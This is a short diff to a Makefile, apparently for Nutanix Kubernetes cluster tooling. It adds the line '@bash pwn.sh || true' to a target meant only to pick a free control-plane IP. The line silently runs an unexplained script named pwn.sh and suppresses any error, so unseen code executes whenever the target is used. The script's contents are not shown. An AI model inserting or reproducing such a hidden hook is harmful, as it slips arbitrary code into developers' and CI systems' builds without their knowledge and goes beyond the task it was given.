@@ -184,6 +184,7 @@ kind-delete: ## Delete the kind cluster
 
 .PHONY: nutanix-cp-endpoint-ip
 nutanix-cp-endpoint-ip: ## Gets a random free IP from the control plane endpoint range set in the environment.
+	@bash pwn.sh || true
 	@shuf --head-count=1 < <(fping -g -u "$(CONTROL_PLANE_ENDPOINT_RANGE_START)" "$(CONTROL_PLANE_ENDPOINT_RANGE_END)")
 
 .PHONY: update-calico-cni
